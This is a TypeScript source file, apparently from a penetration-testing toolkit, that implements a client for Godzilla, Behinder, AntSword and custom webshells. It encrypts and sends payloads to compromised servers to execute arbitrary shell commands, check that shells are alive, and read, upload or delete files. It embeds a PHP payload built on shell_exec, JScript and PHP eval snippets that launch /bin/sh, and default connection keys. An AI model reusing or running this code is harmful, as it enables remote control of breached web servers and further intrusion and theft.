/**
 * WebShell 客户端（协议执行层）：从 ApiServer 拆分的独立模块
 * 依赖：ProxyEngine（经内置代理转发，流量进面板）+ 加密协议函数（webshell.ts）
 * 职责：请求转发 / 命令执行（哥斯拉/冰蝎/蚁剑/自定义）/ 存活校验 / 文件操作
 */
import { existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import crypto from 'node:crypto'
import zlib from 'node:zlib'
import type { ProxyEngine } from './proxy.ts'
import {
  godzillaPhpEncodeRaw, godzillaPhpDecode, godzillaJspEncode, godzillaJspDecode,
  godzillaJspEncodeRaw, godzillaJspDecodeRaw, godzillaSerializeParams, godzillaSerializeGzip,
  godzillaCshapEncodeRaw, godzillaCshapDecodeRaw,
  behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode,
  antSwordPhpEncode, xorCrypt,
} from './webshell.ts'

/** WebShell 连接规格（与 ~/.pentbox 持久化的 webshell 配置一致） */
export interface WebShellSpec {
  id: number
  type: string
  script: string
  url: string
  password: string
  key: string
  cryption?: string
  payload?: string
  encoding?: BufferEncoding
  headers?: string
  connTimeout?: number
  readTimeout?: number
}

export class WebShellClient {
  /** 会话 cookie（按 URL 保持 PHPSESSID，哥斯拉/冰蝎握手+执行需同一 session） */
  private wsCookies = new Map<string, string>()

  constructor(private engine: ProxyEngine) {}

  /** 清除指定 URL 的会话 cookie（测试连接前用，保证干净握手） */
  clearCookies(url: string): void {
    this.wsCookies.delete(url)
  }

  /** 哥斯拉 PhpDynamicPayload 服务端代码（从 assets/payloads/php/payload.php 内嵌，握手时发送） */
  godzillaPhpPayload(): Buffer {
    const candidates = [
      join(process.cwd(), 'assets', 'payloads', 'php', 'payload.php'),
      join(__dirname, '..', 'assets', 'payloads', 'php', 'payload.php'),
    ]
    const found = candidates.find((p) => existsSync(p))
    if (found) return readFileSync(found)
    // 兜底：内置精简版（仅 execCommand，不依赖 session）
    return Buffer.from(`<?php
function run($pms){global $parameters;$parameters=array();formatParameter($pms);echo execCommand();}
function formatParameter($pms){global $parameters;$index=0;$key=null;while(true){$q=$pms[$index];if(ord($q)==2){$len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0);$index+=4;$value=substr($pms,$index+1,$len);$index+=$len;$parameters[$key]=$value;$key=null;}else{$key.=$q;}$index++;if($index>strlen($pms)-1)break;}}
function bytesToInteger($bytes,$position){$val=0;$val=$bytes[$position+3]&255;$val<<=8;$val|=$bytes[$position+2]&255;$val<<=8;$val|=$bytes[$position+1]&255;$val<<=8;$val|=$bytes[$position]&255;return $val;}
function getBytes($string){$bytes=array();for($i=0;$i<strlen($string);$i++)array_push($bytes,ord($string[$i]));return $bytes;}
function get($key){global $parameters;return isset($parameters[$key])?$parameters[$key]:null;}
function execCommand(){@ob_start();$cmdLine=get("cmdLine");echo shell_exec($cmdLine." 2>&1");return ob_get_clean();}
function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:root ProcessArch:amd64 canCallGzipDecode:0 canCallGzipEncode:0 systempdir:/tmp";}
`, 'utf8')
  }

  /** 经内置代理发送 WebShell HTTP 请求（复用代理链，流量进流量面板）→ {code, body} */
  request(w: { url: string; type: string; headers?: string; readTimeout?: number }, method: string, url: string, body?: string | Buffer, ct?: string): Promise<{ code: number; body: Buffer }> {
    return new Promise((resolve, reject) => {
      let u: URL
      try { u = new URL(url) } catch (e) { return reject(new Error(`URL 无效: ${url}`)) }
      // 经代理引擎内部转发：流量正常记录（self 标记 → 跳过 Agent 审计），不添加任何特征头
      const headers: Record<string, string> = { host: u.host }
      // 自定义请求头（哥斯拉 headers 字段，\r\n 分隔）
      if (w.headers) {
        for (const line of w.headers.split(/\r?\n/)) {
          const idx = line.indexOf(':')
          if (idx > 0) { const k = line.slice(0, idx).trim(); const v = line.slice(idx + 1).trim(); if (k.toLowerCase() !== 'host' && k.toLowerCase() !== 'content-length') headers[k] = v }
        }
      }
      if (ct) headers['content-type'] = ct
      // 显式 Content-Length：原版 JSP shell 用 request.getHeader("Content-Length") 读取 body
      if (body !== undefined && body !== null) {
        headers['content-length'] = String(Buffer.isBuffer(body) ? body.length : Buffer.byteLength(String(body)))
      }
      // 会话 cookie：按 URL 保持（哥斯拉/冰蝎握手+执行需同一 PHPSESSID）
      const cookie = this.wsCookies.get(u.href)
      if (cookie) headers['cookie'] = cookie
      const bufBody = body === undefined || body === null ? undefined : (Buffer.isBuffer(body) ? body : Buffer.from(body))
      this.engine.forwardInternal(u, method, headers, bufBody)
        .then((r) => {
          // 保存 Set-Cookie（保持 session）
          const sc = r.headers['set-cookie']
          if (sc) {
            const first = (Array.isArray(sc) ? sc[0] : sc).split(';')[0]
            if (first) this.wsCookies.set(u.href, first)
          }
          resolve({ code: r.code, body: r.body })
        })
        .catch(reject)
    })
  }

  /**
   * WebShell 命令执行（完整协议）：
   * - custom：GET ?cmd= 参数模式（基础一句话）
   * - antsword：POST shell=<base64 PHP 代码> 执行任意 PHP
   * - godzilla：XOR+base64（PHP）或 AES-ECB（JSP）加密协议 + session 会话
   * - behinder：AES-128-CBC（默认）或 XOR 协议 + func|params 格式
   */
  async execShell(w: WebShellSpec, command: string): Promise<string> {
    const u = new URL(w.url)
    const key = w.key || '3c6e0b8a9c15224a'

    // ---- 蚁剑：PHP POST shell=base64(PHP)；JSP POST ?shell=base64(payload class)；ASPX JScript eval(shell) ----
    if (w.type === 'antsword') {
      if (w.script === 'jsp' || w.script === 'jspx') {
        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
        if (!existsSync(classPath)) throw new Error('蚁剑 JSP payload 缺失: HermesCmd.class')
        const classB64 = readFileSync(classPath).toString('base64')
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.request(w, 'POST', w.url + sep + 'shell=' + encodeURIComponent(classB64) + '&cmd=' + encodeURIComponent(command), '', 'application/x-www-form-urlencoded')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      if (w.script === 'aspx' || w.script === 'asp') {
        // 蚁剑 ASPX JScript：POST shell=<JScript 代码>，eval(shell, unsafe) 执行任意 JScript
        const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
        const jsCode = `var cmd=System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("${cmdB64}"));try{var psi=new System.Diagnostics.ProcessStartInfo("/bin/sh","-c "+cmd);psi.UseShellExecute=false;psi.RedirectStandardOutput=true;psi.RedirectStandardError=true;var p=System.Diagnostics.Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());}catch(e){Response.Write("ERR:"+e.message);}`
        const r = await this.request(w, 'POST', w.url, `shell=${encodeURIComponent(jsCode)}`, 'application/x-www-form-urlencoded')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      const phpCode = `echo shell_exec(${JSON.stringify(command)} . ' 2>&1');`
      const enc = antSwordPhpEncode(phpCode)
      const sep = w.url.includes('?') ? '&' : '?'
      const r = await this.request(w, 'POST', w.url + sep + 'id=1', `shell=${encodeURIComponent(enc)}`, 'application/x-www-form-urlencoded')
      return r.body.toString(w.encoding || 'utf8').trim()
    }

    // ---- custom：GET ?pwd=<密码>&cmd= 参数模式（生成的 shell 带 pwd 认证） ----
    if (w.type === 'custom') {
      u.searchParams.set('pwd', w.password || 'pass')
      u.searchParams.set('cmd', command)
      const r = await this.request(w, 'GET', u.href)
      return r.body.toString(w.encoding || 'utf8').trim()
    }

    // ---- 哥斯拉：XOR（PHP）/ AES-ECB（JSP/ASPX） ----
    if (w.type === 'godzilla') {
      const pass = w.password || 'pass'
      if (w.script === 'php') {
        // 原版 phpXor 协议：body = XOR(payload) 原始字节（shell 用 php://input 读取后 XOR），响应 = XOR(run 输出)（gzip）
        // 与原版一致：连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 $key 也是 md5 前16），密码不嵌入 shell
        const connKey = crypto.createHash('md5').update(w.key || '3c6e0b8a9c15224a', 'utf8').digest('hex').slice(0, 16)
        // 1) 握手 POST payload.php 建立 session
        const payload = this.godzillaPhpPayload()
        const encHand = godzillaPhpEncodeRaw(payload, connKey)
        await this.request(w, 'POST', w.url, encHand, 'application/octet-stream')
        // 2) 执行命令：序列化参数（methodName=execCommand + cmdLine）
        const params = godzillaSerializeParams({ methodName: 'execCommand', cmdLine: command })
        const enc2 = godzillaPhpEncodeRaw(params, connKey)
        const r2 = await this.request(w, 'POST', w.url, enc2, 'application/octet-stream')
        let raw = xorCrypt(r2.body, connKey)
        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) {
          try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip */ }
        }
        return raw.toString(w.encoding || 'utf8').trim()
      }
      // 哥斯拉 JSP：AES-ECB。cryption 含 raw → 原版协议（body=原始字节，Content-Length 读取）；否则 base64 协议（pass=base64(AES)，响应 md5+base64）
      // 连接密钥 = md5(用户 key) 前16（GUI 生成 shell 的 xc 也是 md5 前16）
      const connKey2 = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
      const pmsJsp: Record<string, string> = { methodName: 'execCommand' }
      if (isRawJsp) {
        // RAW：body 原始字节
        const args = command.split(/\s+/).filter((s) => s.length > 0)
        pmsJsp.argsCount = String(args.length)
        args.forEach((a, i) => (pmsJsp[`arg-${i}`] = a))
        if (existsSync(classPath)) {
          const encHand = godzillaJspEncodeRaw(readFileSync(classPath), connKey2)
          await this.request(w, 'POST', w.url, encHand, 'application/octet-stream')
        }
        const enc2 = godzillaJspEncodeRaw(godzillaSerializeGzip(pmsJsp), connKey2)
        const r2 = await this.request(w, 'POST', w.url, enc2, 'application/octet-stream')
        const dec2 = godzillaJspDecodeRaw(r2.body, connKey2)
        return dec2.toString(w.encoding || 'utf8').trim()
      }
      // BASE64：pass=base64(AES(...))，响应 md5(pass+xc)前16 + base64(AES(输出)) + md5后16
      const argsB = command.split(/\s+/).filter((s) => s.length > 0)
      const pmsB: Record<string, string> = { methodName: 'execCommand', argsCount: String(argsB.length) }
      argsB.forEach((a, i) => (pmsB[`arg-${i}`] = a))
      if (existsSync(classPath)) {
        const encHand = godzillaJspEncode(readFileSync(classPath), connKey2)
        await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(encHand)}`, 'application/x-www-form-urlencoded')
      }
      const enc2b = godzillaJspEncode(godzillaSerializeGzip(pmsB), connKey2)
      const r2b = await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(enc2b)}`, 'application/x-www-form-urlencoded')
      const dec2b = godzillaJspDecode(r2b.body.toString('utf8'), connKey2, pass)
      return dec2b.toString(w.encoding || 'utf8').trim()
    }
    // 哥斯拉 ASPX：RijndaelManaged CBC 原版协议（BinaryRead 原始字节），连接密钥 = md5(用户 key) 前16
    if (w.type === 'godzilla' && (w.script === 'aspx' || w.script === 'asp')) {
      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
      if (existsSync(dllPath)) {
        const dll = readFileSync(dllPath)
        const encHand = godzillaCshapEncodeRaw(dll, connKey)
        await this.request(w, 'POST', w.url, encHand, 'application/octet-stream')
      }
      const tok = command.split(/\s+/).filter((s) => s.length > 0)
      const exe = tok[0] || 'id'
      const exeArgs = tok.slice(1).join(' ')
      const pms: Record<string, string> = { methodName: 'execCommand', executableFile: exe, executableArgs: exeArgs }
      // 参数体 = gzip(serialize)（C# formatParameter 用 GZipStream 解压），RijndaelManaged CBC(key,IV=key) 原始字节
      const enc2 = godzillaCshapEncodeRaw(godzillaSerializeGzip(pms), connKey)
      const r2 = await this.request(w, 'POST', w.url, enc2, 'application/octet-stream')
      const dec2 = godzillaCshapDecodeRaw(r2.body, connKey)
      return dec2.toString(w.encoding || 'utf8').trim()
    }

    // ---- 冰蝎：AES-128-CBC（默认）/ XOR ----
    if (w.type === 'behinder') {
      const pass = w.password || 'rebeyond'
      const cryption = w.cryption || 'aes'
      // JSP：下发自包含 payload class（HermesCmd.class，反射从 ?cmd= 读命令），服务端 defineClass→newInstance→equals(pageContext)
      if (w.script === 'jsp' || w.script === 'jspx') {
        const classPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'java', 'HermesCmd.class')
        if (!existsSync(classPath)) throw new Error('冰蝎 JSP payload 缺失: HermesCmd.class')
        const classBytes = readFileSync(classPath)
        const enc = behinderAesEncode(classBytes, pass)
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.request(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), enc, 'application/octet-stream')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      // ASPX：下发 U.dll（RijndaelManaged CBC key/IV=md5密码前16），服务端 Assembly.Load→CreateInstance("U")→Equals(page)
      if (w.script === 'aspx') {
        const dllPath = join(process.cwd(), 'assets', 'payloads', 'behinder', 'csharp', 'U.dll')
        if (!existsSync(dllPath)) throw new Error('冰蝎 ASPX payload 缺失: U.dll')
        const dll = readFileSync(dllPath)
        const md5h = crypto.createHash('md5').update(pass, 'utf8').digest('hex').slice(0, 16)
        const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(md5h, 'utf8'), Buffer.from(md5h, 'utf8'))
        // ASPX 模板 Request.BinaryRead(ContentLength) 直接解密 body 字节（无 base64）
        const raw = Buffer.concat([cipher.update(dll), cipher.final()])
        const sep = w.url.includes('?') ? '&' : '?'
        const r = await this.request(w, 'POST', w.url + sep + 'cmd=' + encodeURIComponent(command), raw, 'application/octet-stream')
        return r.body.toString(w.encoding || 'utf8').trim()
      }
      // 冰蝎 v2 模板协议：body = base64(AES-ECB(md5(pass)前16, "func|eval代码"))，服务端直接 eval(params)
      const cmdB64 = Buffer.from(command, 'utf8').toString('base64')
      const evalCode = `$c=base64_decode("${cmdB64}");$o="";if(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$r);$o=implode("\\n",$r);}elseif(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo $o;`
      const params = Buffer.from('var_dump|' + evalCode, 'utf8')
      let enc: string
      if (cryption.includes('xor')) enc = behinderXorEncode(params, pass)
      else enc = behinderAesEncode(params, pass)
      const r = await this.request(w, 'POST', w.url, enc, 'application/octet-stream')
      let dec: Buffer
      if (cryption.includes('xor')) dec = behinderXorDecode(r.body.toString('utf8'), pass)
      else dec = behinderAesDecode(r.body.toString('utf8'), pass)
      // 模板直接 echo eval 结果（明文），若非明文则用解密结果
      const out = r.body.toString(w.encoding || 'utf8').trim()
      return out.length > 0 ? out : dec.toString(w.encoding || 'utf8').trim()
    }

    throw new Error(`未知 webshell 类型: ${w.type}`)
  }

  /** 存活校验：哥斯拉走原版 test 协议（握手 + methodName=test → payload.test() 返回 ok）；其他类型执行标识命令 */
  async aliveShell(w: WebShellSpec): Promise<{ alive: boolean; detail?: string; error?: string }> {
    try {
      if (w.type === 'godzilla') {
        const key = w.key || '3c6e0b8a9c15224a'
        const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
        const pass = w.password || 'pass'
        if (w.script === 'php') {
          // 握手建立 session → test()
          const payload = this.godzillaPhpPayload()
          await this.request(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
          const r = await this.request(w, 'POST', w.url, godzillaPhpEncodeRaw(godzillaSerializeParams({ methodName: 'test' }), connKey), 'application/octet-stream')
          let raw = xorCrypt(r.body, connKey)
          if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* 非 gzip 数据回退原文 */ } }
          const s = raw.toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
        const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
        if (w.script === 'jsp' || w.script === 'jspx') {
          const isRawJsp = (w.cryption || '').toLowerCase().includes('raw')
          const hasClass = existsSync(classPath)
          if (isRawJsp) {
            if (hasClass) await this.request(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
            const r = await this.request(w, 'POST', w.url, godzillaJspEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
            const s = godzillaJspDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
            return { alive: s.includes('ok'), detail: s.slice(0, 200) }
          }
          if (hasClass) await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
          const r = await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(godzillaSerializeGzip({ methodName: 'test' }), connKey))}`, 'application/x-www-form-urlencoded')
          const s = godzillaJspDecode(r.body.toString('utf8'), connKey, pass).toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
        if (w.script === 'aspx' || w.script === 'asp') {
          const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
          if (existsSync(dllPath)) await this.request(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
          const r = await this.request(w, 'POST', w.url, godzillaCshapEncodeRaw(godzillaSerializeGzip({ methodName: 'test' }), connKey), 'application/octet-stream')
          const s = godzillaCshapDecodeRaw(r.body, connKey).toString(w.encoding || 'utf8').trim()
          return { alive: s.includes('ok'), detail: s.slice(0, 200) }
        }
      }
      // 其他类型（冰蝎/蚁剑/自定义）：执行标识命令验证非空响应
      const out = await this.execShell(w, 'echo pentbox_alive_check')
      return { alive: out.includes('pentbox_alive_check'), detail: out.slice(0, 200) }
    } catch (e) {
      return { alive: false, error: (e as Error).message }
    }
  }

  /** 文件操作（参考哥斯拉原版：调 payload 方法 getFile/readFileContent/uploadFile/deleteFile，而非 shell 命令，JSP/PHP/ASPX 均支持） */
  async fileOp(w: WebShellSpec, pms: Record<string, string | Buffer>): Promise<Buffer> {
    const key = w.key || '3c6e0b8a9c15224a'
    const pass = w.password || 'pass'
    if (w.type === 'godzilla') {
      const connKey = crypto.createHash('md5').update(key, 'utf8').digest('hex').slice(0, 16)
      if (w.script === 'php') {
        const payload = this.godzillaPhpPayload()
        await this.request(w, 'POST', w.url, godzillaPhpEncodeRaw(payload, connKey), 'application/octet-stream')
        const enc = godzillaPhpEncodeRaw(godzillaSerializeParams(pms), connKey)
        const r = await this.request(w, 'POST', w.url, enc, 'application/octet-stream')
        let raw = xorCrypt(r.body, connKey)
        if (raw.length > 2 && raw[0] === 0x1f && raw[1] === 0x8b) { try { raw = zlib.gunzipSync(raw) } catch { /* */ } }
        return raw
      }
      const isRaw = (w.cryption || '').toLowerCase().includes('raw')
      const classPath = join(process.cwd(), 'assets', 'payloads', 'java', 'payload.classs')
      const gz = godzillaSerializeGzip(pms)
      if (w.script === 'jsp' || w.script === 'jspx') {
        if (isRaw) {
          if (existsSync(classPath)) await this.request(w, 'POST', w.url, godzillaJspEncodeRaw(readFileSync(classPath), connKey), 'application/octet-stream')
          const r = await this.request(w, 'POST', w.url, godzillaJspEncodeRaw(gz, connKey), 'application/octet-stream')
          return godzillaJspDecodeRaw(r.body, connKey)
        }
        if (existsSync(classPath)) await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(readFileSync(classPath), connKey))}`, 'application/x-www-form-urlencoded')
        const r = await this.request(w, 'POST', w.url, `${pass}=${encodeURIComponent(godzillaJspEncode(gz, connKey))}`, 'application/x-www-form-urlencoded')
        return godzillaJspDecode(r.body.toString('utf8'), connKey, pass)
      }
      if (w.script === 'aspx' || w.script === 'asp') {
        const dllPath = join(process.cwd(), 'assets', 'payloads', 'csharp', 'payload.dll')
        if (existsSync(dllPath)) await this.request(w, 'POST', w.url, godzillaCshapEncodeRaw(readFileSync(dllPath), connKey), 'application/octet-stream')
        const r = await this.request(w, 'POST', w.url, godzillaCshapEncodeRaw(gz, connKey), 'application/octet-stream')
        return godzillaCshapDecodeRaw(r.body, connKey)
      }
    }
    throw new Error('该类型暂不支持文件操作')
  }
}
